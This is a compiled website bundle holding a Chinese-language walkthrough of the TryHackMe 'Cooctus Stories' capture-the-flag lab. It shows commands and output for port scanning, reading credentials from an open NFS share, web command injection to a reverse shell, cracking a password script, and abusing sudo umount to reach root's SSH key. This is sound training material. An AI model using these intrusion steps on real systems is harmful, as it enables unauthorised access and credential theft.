"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[9972],{37600:(n,e,t)=>{t.r(e),t.d(e,{assets:()=>c,contentTitle:()=>a,default:()=>x,frontMatter:()=>s,metadata:()=>i,toc:()=>d});var r=t(74848),o=t(28453);const s={sidebar_position:124,tags:["Easy","Linux","\u547d\u4ee4\u6ce8\u5165","SUDO"],title:"Cooctus Stories",description:"Cooctus Stories",sidebar_label:"Cooctus Stories",slug:"/tryhackme/124"},a="Cooctus Stories",i={id:"box/TryHackMe/124",title:"Cooctus Stories",description:"Cooctus Stories",source:"@site/docs/box/TryHackMe/124.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/124",permalink:"/docs/tryhackme/124",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u547d\u4ee4\u6ce8\u5165",permalink:"/docs/tags/\u547d\u4ee4\u6ce8\u5165"},{label:"SUDO",permalink:"/docs/tags/sudo"}],version:"current",sidebarPosition:124,frontMatter:{sidebar_position:124,tags:["Easy","Linux","\u547d\u4ee4\u6ce8\u5165","SUDO"],title:"Cooctus Stories",description:"Cooctus Stories",sidebar_label:"Cooctus Stories",slug:"/tryhackme/124"},sidebar:"boxSidebar",previous:{title:"Jacob the Boss",permalink:"/docs/tryhackme/123"},next:{title:"Develpy",permalink:"/docs/tryhackme/125"}},c={},d=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"NFS",id:"nfs",level:2},{value:"80",id:"80",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"paradox",id:"paradox",level:3},{value:"paradox \u2014&gt;szymex",id:"paradox-szymex",level:3},{value:"szymex \u2014&gt; tux",id:"szymex--tux",level:3},{value:"tux \u2014&gt;varg",id:"tux-varg",level:3},{value:"varg \u2014&gt; root",id:"varg--root",level:3}];function l(n){const e={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,o.R)(),...n.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(e.h1,{id:"cooctus-stories",children:"Cooctus Stories"}),"\n",(0,r.jsx)(e.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-139-22:~/cooctusadventures# nmap -sTCV -p 22,111,2049,8080,36763,45981,54155,55573 --min-rate 1000 10.10.220.72\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-09-28 11:36 BST\nNmap scan report for ip-10-10-220-72.eu-west-1.compute.internal (10.10.220.72)\nHost is up (0.00027s latency).\n\nPORT      STATE  SERVICE  VERSION\n22/tcp    open   ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 e5:44:62:91:90:08:99:5d:e8:55:4f:69:ca:02:1c:10 (RSA)\n|   256 e5:a7:b0:14:52:e1:c9:4e:0d:b8:1a:db:c5:d6:7e:f0 (ECDSA)\n|_  256 02:97:18:d6:cd:32:58:17:50:43:dd:d2:2f:ba:15:53 (EdDSA)\n111/tcp   open   rpcbind  2-4 (RPC #100000)\n| rpcinfo: \n|   program version   port/proto  service\n|   100000  2,3,4        111/tcp  rpcbind\n|   100000  2,3,4        111/udp  rpcbind\n|   100003  3           2049/udp  nfs\n|   100003  3,4         2049/tcp  nfs\n|   100005  1,2,3      45891/tcp  mountd\n|   100005  1,2,3      53839/udp  mountd\n|   100021  1,3,4      36763/tcp  nlockmgr\n|   100021  1,3,4      58782/udp  nlockmgr\n|   100227  3           2049/tcp  nfs_acl\n|_  100227  3           2049/udp  nfs_acl\n2049/tcp  open   nfs_acl  3 (RPC #100227)\n8080/tcp  open   http     Werkzeug httpd 0.14.1 (Python 3.6.9)\n|_http-title: CCHQ\n36763/tcp open   nlockmgr 1-4 (RPC #100021)\n45981/tcp closed unknown\n54155/tcp open   mountd   1-3 (RPC #100005)\n55573/tcp open   mountd   1-3 (RPC #100005)\nMAC Address: 02:C6:13:D4:69:91 (Unknown)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n"})}),"\n",(0,r.jsx)(e.h2,{id:"nfs",children:"NFS"}),"\n",(0,r.jsx)(e.p,{children:"\u5728 rpcbing \u7684\u8f93\u51fa\u4e2d\u5b58\u5728 nfs \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u679a\u4e3e nfs \u670d\u52a1, \u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a\u5171\u4eab\u6587\u4ef6\u5939, \u7ecf\u8fc7\u67e5\u770b\u4ece\u8fd9\u91cc\u83b7\u53d6\u5230\u4e86\u4e00\u4e2a\u51ed\u8bc1"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-145-85:~/cooctusadventures# showmount -e 10.10.161.120\nExport list for 10.10.161.120:\n/var/nfs/general *\nroot@ip-10-10-145-85:~/cooctusadventures# mkdir  general\nroot@ip-10-10-145-85:~/cooctusadventures# mount -t nfs 10.10.161.120:/var/nfs/general ./general/ -o nolock\nroot@ip-10-10-145-85:~/cooctusadventures# cd general/\nroot@ip-10-10-145-85:~/cooctusadventures/general# ls -al\ntotal 12\ndrwxr-xr-x 2 nobody nogroup 4096 Nov 21  2020 .\ndrwxr-xr-x 3 root   root    4096 Sep 30 03:02 ..\n-rw-r--r-- 1 root   root      31 Nov 21  2020 credentials.bak\nroot@ip-10-10-145-85:~/cooctusadventures/general# cat credentials.bak \nparadoxial.test\nShibaPretzel79\nroot@ip-10-10-145-85:~/cooctusadventures/general\n"})}),"\n",(0,r.jsx)(e.h2,{id:"80",children:"80"}),"\n",(0,r.jsx)(e.p,{children:"\u8fdb\u884c\u76ee\u5f55\u626b\u63cf"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-bash",children:"root@ip-10-10-145-85:~/cooctusadventures# gobuster dir -u http://10.10.161.120:8080/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,txt \n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.161.120:8080/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     html,txt\n[+] Timeout:        10s\n===============================================================\n2023/09/30 03:05:32 Starting gobuster\n===============================================================\n/login (Status: 200)\n/cat (Status: 302)\n"})}),"\n",(0,r.jsx)(e.p,{children:"\u5728\u8bbf\u95ee\u65f6\u53d1\u73b0\u9700\u8981\u767b\u9646, \u56e0\u6b64\u4f7f\u7528\u4e0a\u9762\u5f97\u5230\u7684\u5bc6\u7801\u8fdb\u884c\u767b\u9646 (\u6ce8\u610f : \u8981\u5728 cat \u4e2d\u8fdb\u884c\u64cd\u4f5c, \u5426\u5219\u4e0d\u4f1a\u8df3\u8f6c), \u5728\u767b\u9646\u4e4b\u540e\u6709\u4e00\u4e2a\u53d1\u9001\u7684\u7a97\u53e3\u6240\u4ee5\u6211\u5728\u6b64\u4e4b\u95f4\u6267\u884c\u4e86\u53cd\u5411 shell \u547d\u4ee4, \u5c31\u5f97\u5230\u4e86 Shell"}),"\n",(0,r.jsx)(e.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,r.jsx)(e.h3,{id:"paradox",children:"paradox"}),"\n",(0,r.jsx)(e.p,{children:(0,r.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-142205.png",alt:"Untitled"})}),"\n",(0,r.jsx)(e.p,{children:(0,r.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-142205-1.png",alt:"Untitled"})}),"\n",(0,r.jsx)(e.h3,{id:"paradox-szymex",children:"paradox \u2014>szymex"}),"\n",(0,r.jsx)(e.p,{children:"\u6211\u8fdb\u884c\u4e86\u4e00\u4e9b\u641c\u7d22\u53d1\u73b0\u5728 szymex \u7528\u6237\u7684\u5bb6\u76ee\u5f55\u4e2d\u5b58\u5728\u4e00\u4e9b\u7279\u6b8a\u6027, \u5e76\u4e14\u6709\u4e00\u4e2a\u5b9a\u65f6\u4efb\u52a1, \u56e0\u6b64\u5728\u6211\u67e5\u770b\u76f8\u5173\u6587\u4ef6\u540e\u5f97\u51fa\u7ed3\u8bba:"}),"\n",(0,r.jsxs)(e.ul,{children:["\n",(0,r.jsx)(e.li,{children:"mysupersecretpassword.cat  : \u7528\u6237\u7684\u5bc6\u7801\u6587\u4ef6"}),"\n",(0,r.jsx)(e.li,{children:"SniffingCat.py : \u89e3\u5bc6\u7a0b\u5e8f"}),"\n"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-bash",children:"(remote) paradox@cchq:/home$ ls -al szymex/\ntotal 44\ndrwxr-xr-x 5 szymex szymex 4096 Feb 22  2021 .\ndrwxr-xr-x 6 root   root   4096 Jan  2  2021 ..\n-r-------- 1 szymex szymex   11 Jan  2  2021 mysupersecretpassword.cat \n-rw-rw-r-- 1 szymex szymex  316 Feb 20  2021 note_to_para\n-rwxrwxr-- 1 szymex szymex  735 Feb 20  2021 SniffingCat.py\n\n(remote) paradox@cchq:/home$ cat /etc/crontab \n# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user\tcommand\n17 *\t* * *\troot    cd / && run-parts --report /etc/cron.hourly\n25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n* * \t* * * \tszymex\t/home/szymex/SniffingCat.py\n"})}),"\n",(0,r.jsx)(e.p,{children:"\u63a5\u7740\u6211\u6839\u636e\u9a8c\u8bc1\u7a0b\u5e8f\u8fdb\u884c\u4e86\u9006\u5411\u83b7\u53d6\u5bc6\u7801, \u5728\u6b64\u6211\u5217\u51fa\u4e86\u6240\u6709\u7684\u53ef\u80fd, \u63a5\u7740\u4fbf\u8fdb\u884c\u7206\u7834\u6700\u7ec8\u5f97\u5230\u5bc6\u7801 : cherrycoke"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-bash",children:'ens_pw = "pureelpbxr"\npassword = list()\nfor i in ens_pw:\n    if ord(i) < 98 or ord(i) > 109:\n        if len(password) == 0:\n            password.append(chr(ord(i)-13))\n        elif len(password) == 1:\n            password[0] = password[0] + chr(ord(i) - 13)\n        else:\n            for t in range(len(password)):\n                password[t] = password[t] + chr(ord(i) - 13)\n    else:\n        temp = list()\n        for t in password:\n            temp.append(t + chr(ord(i) - 13))\n            temp.append(t + chr(ord(i) + 13))\n        password = temp\n\nfor i in password:\n    print(i)\n'})}),"\n",(0,r.jsx)(e.p,{children:"\u4f7f\u7528\u5f97\u5230\u7684\u5bc6\u7801\u8fdb\u884c\u5207\u6362\u7528\u6237"}),"\n",(0,r.jsx)(e.p,{children:(0,r.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-142205-2.png",alt:"Untitled"})}),"\n",(0,r.jsx)(e.h3,{id:"szymex--tux",children:"szymex \u2014> tux"}),"\n",(0,r.jsx)(e.p,{children:"\u5728\u4e0a\u56fe\u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u6709\u4e00\u4e2a\u7279\u6b8a\u7684\u7ec4 testers , \u56e0\u6b64\u6211\u4fbf\u67e5\u627e\u8be5\u7ec4\u7684\u6587\u4ef6\u53d1\u73b0\u4e00\u7cfb\u5217\u7684\u89e3\u5bc6"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-bash",children:"szymex@cchq:~$ find / -group testers 2>/dev/null\n/home/tux/tuxling_3\n/home/tux/tuxling_3/note\n/home/tux/tuxling_1\n/home/tux/tuxling_1/nootcode.c\n/home/tux/tuxling_1/note\n/media/tuxling_2\n/media/tuxling_2/private.key\n/media/tuxling_2/note\n/media/tuxling_2/fragment.asc\n"})}),"\n",(0,r.jsxs)(e.ul,{children:["\n",(0,r.jsxs)(e.li,{children:["\n",(0,r.jsx)(e.p,{children:"tuxling_1"}),"\n",(0,r.jsx)(e.p,{children:"\u67e5\u770b c \u7a0b\u5e8f\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u8fdb\u884c\u4e86\u6df7\u6dc6"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-c",children:'#include <stdio.h>\n\n#define noot int\n#define Noot main\n#define nOot return\n#define noOt (\n#define nooT )\n#define NOOOT "f96"\n#define NooT ;\n#define Nooot nuut\n#define NOot {\n#define nooot key\n#define NoOt }\n#define NOOt void\n#define NOOT "NOOT!\\n"\n#define nooOT "050a"\n#define noOT printf\n#define nOOT 0\n#define nOoOoT "What does the penguin say?\\n"\n#define nout "d61"\n\nnoot Noot noOt nooT NOot\n    noOT noOt nOoOoT nooT NooT\n    Nooot noOt nooT NooT\n\n    nOot nOOT NooT\nNoOt\n\nNOOt nooot noOt nooT NOot\n    noOT noOt NOOOT nooOT nout nooT NooT\nNoOt\n\nNOOt Nooot noOt nooT NOot\n    noOT noOt NOOT nooT NooT\nNoOt\n'})}),"\n",(0,r.jsx)(e.p,{children:"\u56e0\u6b64\u6211\u8fdb\u884c\u4e86\u66ff\u6362\u64cd\u4f5c, \u6700\u540e\u5f97\u5230\u7684\u660e\u6587\u4e3a:"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-c",children:'#include <stdio.h>\n\nint main ( ) {\n    printf ( "What does the penguin say?\\n" ) ;\n    nuut ( ) ;\n    return 0 ;\n}\n\nvoid key ( ) {\n    printf ( "f96" "050a" "d61" ) ;\n}\n\nvoid nuut ( ) {\n    printf ( "NOOT!\\n" ) ;\n}\n'})}),"\n"]}),"\n",(0,r.jsxs)(e.li,{children:["\n",(0,r.jsx)(e.p,{children:"tuxling_2"}),"\n",(0,r.jsx)(e.p,{children:"\u4ece\u63d0\u793a\u6765\u770b\u8fd9\u662f\u4e00\u4e2a\u52a0\u5bc6\u7684\u5bc6\u6587, \u76f4\u63a5\u4e0b\u8f7d\u4e0b\u6765\u8fdb\u884c\u89e3\u5bc6"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-c",children:'root@ip-10-10-145-85:~/cooctusadventures# gpg --import private.key \ngpg: /root/.gnupg/trustdb.gpg: trustdb created\ngpg: key B70EB31F8EF3187C: public key "TuxPingu" imported\ngpg: key B70EB31F8EF3187C: secret key imported\ngpg: Total number processed: 1\ngpg:               imported: 1\ngpg:       secret keys read: 1\ngpg:   secret keys imported: 1\nroot@ip-10-10-145-85:~/cooctusadventures#  gpg --decrypt fragment.asc \ngpg: Note: secret key 97D48EB17511A6FA expired at Mon 20 Feb 2023 19:58:30 GMT\ngpg: encrypted with 3072-bit RSA key, ID 97D48EB17511A6FA, created 2021-02-20\n      "TuxPingu"\nThe second key fragment is: 6eaf62818d\n'})}),"\n"]}),"\n",(0,r.jsxs)(e.li,{children:["\n",(0,r.jsx)(e.p,{children:"tuxling_3"}),"\n",(0,r.jsx)(e.p,{children:"\u76f4\u63a5\u5c31\u660e\u6587\u663e\u793a\u4e86"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-bash",children:"(remote) szymex@cchq:/home/tux/tuxling_1$ cat /home/tux/tuxling_3/note\nHi! Kowalski here. \nI was practicing my act of disappearance so good job finding me.\n\nHere take this,\nThe last fragment is: 637b56db1552\n\nCombine them all and visit the station.\n"})}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(e.p,{children:"\u5c06\u5f97\u5230\u7684\u5185\u5bb9\u8fdb\u884c\u89e3\u5bc6\u4ece\u800c\u83b7\u53d6\u5230\u7528\u6237 tux \u7684\u5bc6\u7801"}),"\n",(0,r.jsx)(e.p,{children:(0,r.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-142205-3.png",alt:"Untitled"})}),"\n",(0,r.jsx)(e.h3,{id:"tux-varg",children:"tux \u2014>varg"}),"\n",(0,r.jsx)(e.p,{children:"\u5207\u6362\u7528\u6237\u540e\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u7528\u6237\u53ef\u4ee5\u4ee5 varg \u7528\u6237\u7684\u8eab\u4efd\u8fd0\u884c\u4e00\u4e2a\u811a\u672c"}),"\n",(0,r.jsx)(e.p,{children:(0,r.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-142205-4.png",alt:"Untitled"})}),"\n",(0,r.jsx)(e.p,{children:"\u63a5\u7740\u6211\u67e5\u770b\u8fd9\u4e2a\u76ee\u5f55\u5e76\u4ece\u4e2d\u5206\u6790\u51fa\u4e00\u70b9\u5185\u5bb9"}),"\n",(0,r.jsxs)(e.ul,{children:["\n",(0,r.jsxs)(e.li,{children:["cooctOS_src : \u5e94\u8be5\u662f  ",(0,r.jsx)(e.a,{href:"http://CooctOS.py",children:"CooctOS.py"})," \u7684\u6e90\u76ee\u5f55, \u5e76\u4e14\u662f\u4e00\u4e2a git \u6587\u4ef6\u5939, \u76f4\u63a5\u6253\u5305\u4e0b\u8f7d\u5230\u672c\u5730\u8fdb\u884c\u67e5\u770b"]}),"\n"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-bash",children:"tux@cchq:/home/varg$ ls -al\ntotal 48\ndrwxr-xr-x  7 varg varg      4096 Feb 20  2021 .\ndrwxr-xr-x  6 root root      4096 Jan  2  2021 ..\n-rwsrws--x  1 varg varg      2146 Feb 20  2021 CooctOS.py\ndrwxrwx--- 11 varg os_tester 4096 Feb 20  2021 cooctOS_src\n.....\ntux@cchq:/home/varg/cooctOS_src$ ls -al\ntotal 44\ndrwxrwx--- 11 varg os_tester 4096 Feb 20  2021 .\ndrwxr-xr-x  7 varg varg      4096 Feb 20  2021 ..\ndrwxrwx---  2 varg os_tester 4096 Feb 20  2021 bin\ndrwxrwx---  4 varg os_tester 4096 Feb 20  2021 boot\ndrwxrwx---  2 varg os_tester 4096 Feb 20  2021 etc\ndrwxrwx---  2 varg os_tester 4096 Feb 20  2021 games\ndrwxrwxr-x  8 varg os_tester 4096 Feb 20  2021 .git\ndrwxrwx---  3 varg os_tester 4096 Feb 20  2021 lib\ndrwxrwx--- 16 varg os_tester 4096 Feb 20  2021 run\ndrwxrwx---  2 varg os_tester 4096 Feb 20  2021 tmp\ndrwxrwx--- 11 varg os_tester 4096 Feb 20  2021 var\ntux@cchq:/home/varg/cooctOS_src$ git log\ncommit 8b8daa41120535c569d0b99c6859a1699227d086 (HEAD -> master)\nAuthor: Vargles <varg@cchq.noot>\nDate:   Sat Feb 20 15:47:21 2021 +0000\n\n    Removed CooctOS login script for now\n\ncommit 6919df5c171460507f69769bc20e19bd0838b74d\nAuthor: Vargles <varg@cchq.noot>\nDate:   Sat Feb 20 15:46:28 2021 +0000\n\n    Created git repo for CooctOS\n"})}),"\n",(0,r.jsx)(e.p,{children:"\u5bf9\u6211\u4eec\u7684\u6587\u4ef6\u8fdb\u884c\u5206\u6790\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5bc6\u7801\u4ee5\u53ca\u8d26\u6237"}),"\n",(0,r.jsx)(e.p,{children:(0,r.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-142205-5.png",alt:"Untitled"})}),"\n",(0,r.jsx)(e.p,{children:"\u76f4\u63a5\u4f7f\u7528\u5176\u8fdb\u884c\u767b\u9646"}),"\n",(0,r.jsx)(e.p,{children:(0,r.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-142205-6.png",alt:"Untitled"})}),"\n",(0,r.jsx)(e.h3,{id:"varg--root",children:"varg \u2014> root"}),"\n",(0,r.jsx)(e.p,{children:"\u6211\u53d1\u73b0\u7528\u6237 varg \u5177\u6709 SUDO \u7279\u6743"}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-bash",children:"varg@cchq:/tmp$ sudo -l\nMatching Defaults entries for varg on cchq:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser varg may run the following commands on cchq:\n    (root) NOPASSWD: /bin/umount\n"})}),"\n",(0,r.jsx)(e.p,{children:"\u63a5\u7740\u6211\u53d1\u73b0\u4e86\u4e00\u4e2a\u53ef\u4ee5\u5229\u7528\u7684\u65b9\u6cd5"}),"\n",(0,r.jsx)(e.p,{children:(0,r.jsx)(e.a,{href:"https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-umount-privilege-escalation/",children:"Sudo Umount Privilege Escalation | Exploit Notes"})}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-bash",children:"varg@cchq:/tmp$ cat /etc/fstab\n# /etc/fstab: static file system information.\n#\n# Use 'blkid' to print the universally unique identifier for a\n# device; this may be used with UUID= as a more robust way to name devices\n# that works even if disks are added and removed. See fstab(5).\n#\n# <file system> <mount point>   <type>  <options>       <dump>  <pass>\n# / was on /dev/ubuntu-vg/ubuntu-lv during curtin installation\n/dev/disk/by-id/dm-uuid-LVM-mrAx163lW73D8hFDlydZU2zYDwkd7tgT28ehcZQNMmzJmc0XKYP9m3eluIT1sZGo\t/\text4\tdefaults\t0 0\n# /boot was on /dev/sda2 during curtin installation\n/dev/disk/by-uuid/6885d03d-f1fb-4785-971e-2bb17a3d22e3\t/boot\text4\tdefaults\t0 0\n#/swap.img\tnone\tswap\tsw\t0 0\n/home/varg/cooctOS_src\t/opt/CooctFS\tnone\tdefaults,bind\t0 0\nvarg@cchq:/tmp$ ls -al /opt/CooctFS\ntotal 44\ndrwxrwx--- 11 varg os_tester 4096 Feb 20  2021 .\ndrwxr-xr-x  3 root root      4096 Feb 20  2021 ..\ndrwxrwx---  2 varg os_tester 4096 Feb 20  2021 bin\ndrwxrwx---  4 varg os_tester 4096 Feb 20  2021 boot\ndrwxrwx---  2 varg os_tester 4096 Feb 20  2021 etc\ndrwxrwx---  2 varg os_tester 4096 Feb 20  2021 games\ndrwxrwxr-x  8 varg os_tester 4096 Feb 20  2021 .git\ndrwxrwx---  3 varg os_tester 4096 Feb 20  2021 lib\ndrwxrwx--- 16 varg os_tester 4096 Feb 20  2021 run\ndrwxrwx---  2 varg os_tester 4096 Feb 20  2021 tmp\ndrwxrwx--- 11 varg os_tester 4096 Feb 20  2021 var\nvarg@cchq:/tmp$ sudo  /bin/umount /opt/CooctFS\nvarg@cchq:/tmp$ ls -al /opt/CooctFS\ntotal 12\ndrwxr-xr-x 3 root root 4096 Feb 20  2021 .\ndrwxr-xr-x 3 root root 4096 Feb 20  2021 ..\ndrwxr-xr-x 5 root root 4096 Feb 20  2021 root\n"})}),"\n",(0,r.jsx)(e.p,{children:"\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5728  /opt/CooctFS \u6709\u4e00\u4e2a root \u76ee\u5f55, \u8fd9\u65f6\u5019\u6211\u4eec\u9700\u8981\u91cd\u542f\u4e00\u4e2a shell \u6765\u8fdb\u884c\u767b\u9646"}),"\n",(0,r.jsxs)(e.ul,{children:["\n",(0,r.jsx)(e.li,{children:"\u4ece flag.txt \u8868\u660e\u8fd9\u662f\u6545\u610f\u8bbe\u7f6e\u7684, \u5e76\u4e14\u6211\u53d1\u73b0\u4e86 ssh \u7684\u6587\u4ef6\u5939, \u53ef\u4ee5\u4ece\u4e2d\u8bfb\u53d6 root \u7684 SSH \u79c1\u94a5"}),"\n"]}),"\n",(0,r.jsx)(e.pre,{children:(0,r.jsx)(e.code,{className:"language-bash",children:"tux@cchq:/opt/CooctFS$ cd root\ntux@cchq:/opt/CooctFS/root$ ls\nroot.txt\ntux@cchq:/opt/CooctFS/root$ cat root.txt\nhmmm...\nNo flag here. You aren't root yet.\ntux@cchq:/opt/CooctFS/root$ ls -al\ntotal 28\ndrwxr-xr-x 5 root root 4096 Feb 20  2021 .\ndrwxr-xr-x 3 root root 4096 Feb 20  2021 ..\nlrwxrwxrwx 1 root root    9 Feb 20  2021 .bash_history -> /dev/null\n-rw-r--r-- 1 root root 3106 Feb 20  2021 .bashrc\ndrwx------ 3 root root 4096 Feb 20  2021 .cache\ndrwxr-xr-x 3 root root 4096 Feb 20  2021 .local\n-rw-r--r-- 1 root root   43 Feb 20  2021 root.txt\ndrwxr-xr-x 2 root root 4096 Feb 20  2021 .ssh\n"})}),"\n",(0,r.jsx)(e.p,{children:"\u4f7f\u7528\u5f97\u5230\u7684\u79c1\u94a5\u8fdb\u884c\u767b\u9646"}),"\n",(0,r.jsx)(e.p,{children:(0,r.jsx)(e.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240709-142205-7.png",alt:"Untitled"})})]})}function x(n={}){const{wrapper:e}={...(0,o.R)(),...n.components};return e?(0,r.jsx)(e,{...n,children:(0,r.jsx)(l,{...n})}):l(n)}},28453:(n,e,t)=>{t.d(e,{R:()=>a,x:()=>i});var r=t(96540);const o={},s=r.createContext(o);function a(n){const e=r.useContext(s);return r.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function i(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(o):n.components||o:a(n.components),r.createElement(s.Provider,{value:e},n.children)}}}]);